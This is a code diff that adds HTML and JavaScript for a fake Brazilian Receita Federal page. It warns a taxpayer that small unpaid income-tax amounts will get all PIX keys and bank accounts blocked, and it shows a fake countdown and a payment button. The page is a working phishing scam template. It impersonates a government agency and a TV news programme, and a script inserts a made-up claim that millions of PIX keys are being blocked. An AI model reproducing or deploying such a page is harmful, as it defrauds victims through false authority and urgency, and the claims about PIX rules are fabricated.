@@ -1,0 +1,79 @@
+    <div class="user-info">
+        <div class="user-info-content">
+            <div class="user-info-text">
+                <h3>Notícia na mídia</h3>
+                <p><strong>Programa:</strong> Jornal da Band</p>
+                <p><strong>Data:</strong> 05 de março de 2025</p>
+            </div>
+        </div>
+        <img alt="News anchor reporting on PIX rules changes" class="news-image" src="https://thumb.mais.uol.com.br/17168881-xlarge.jpg?ver=1"/>
+        <p class="news-description" id="newsDescription"></p>
+    </div>
+    <div class="user-info">
+        <div class="user-info-content">
+            <div class="user-info-text">
+                <h3>DADOS DO CONTRIBUINTE</h3>
+                <p><strong>NOME:</strong> JOÃO DA SILVA SANTOS</p>
+                <p><strong>CPF:</strong> 123.456.789-00</p>
+            </div>
+            <img src="https://i.ibb.co/xKfzBFbn/download-1.png" alt="User profile icon" class="user-info-image">
+        </div>
+        <div class="message-box">
+            <p><span class="red-strong">Atenção João:</span> Há inconsistências no imposto de renda de <strong>2019, 2020 e 2021.</strong> Conforme as novas regras do PIX, <span class="red-strong">todas as chaves PIX vinculadas ao seu CPF</span> serão bloqueadas se as pendências não forem pagas. Isso inclui <strong>todas as suas contas bancárias.</strong></p>
+            <div class="countdown-timer" id="countdown">Tempo restante: 23h 40m 52s</div>
+        </div>
+        <div class="tax-details">
+            <h4>Valores não pagos do Imposto de Renda de Pessoa Física:</h4>
+            <ul>
+                <li><strong>2019:</strong> R$ 47,61</li>
+                <li><strong>2020:</strong> R$ 52,38</li>
+                <li><strong>2021:</strong> R$ 42,84</li>
+            </ul>
+            <p><strong>Total devido: R$ 142,83</strong></p>
+            <p>Para evitar a suspensão do PIX em todas as contas bancárias vinculadas ao CPF 123.456.789-00, é obrigatório efetuar o pagamento deste valor imediatamente.</p>
+            <button class="regularize-button">Regularizar agora</button>
+        </div>
+    </div>
+    <footer class="footer">
+        <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
+        <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
+    </footer>
+    <script>
+        function startCountdown(duration, display) {
+            let timer = duration, hours, minutes, seconds;
+            setInterval(function () {
+                hours = parseInt(timer / 3600, 10);
+                minutes = parseInt((timer % 3600) / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                hours = hours < 10 ? "0" + hours : hours;
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = `Tempo restante: ${hours}h ${minutes}m ${seconds}s`;
+
+                if (--timer < 0) {
+                    timer = 0;
+                }
+            }, 1000);
+        }
+
+        function getNextDay() {
+            const today = new Date();
+            const tomorrow = new Date(today);
+            tomorrow.setDate(tomorrow.getDate() + 1);
+            return tomorrow.getDate().toString().padStart(2, '0');
+        }
+
+        window.onload = function () {
+            const countdownElement = document.getElementById('countdown');
+            const countdownDuration = 23 * 3600 + 42 * 60; // 23 hours and 42 minutes in seconds
+            startCountdown(countdownDuration, countdownElement);
+
+            const nextDay = getNextDay();
+            const newsDescription = document.getElementById('newsDescription');
+            newsDescription.innerHTML = `<strong>Novas regras do Pix</strong>, válidas a partir de <strong>05/03/2025</strong>, determinarão o <strong>bloqueio de chaves</strong> vinculadas a CPFs com pendências na Receita Federal. <strong>Mais de 8 milhões de chaves</strong> serão bloqueadas até <strong>${nextDay}/03/25</strong> se as irregularidades não forem resolvidas, <strong>impedindo o envio e recebimento de valores pelo Pix</strong>.`;
+        };
+    </script>
+</body>
+</html>
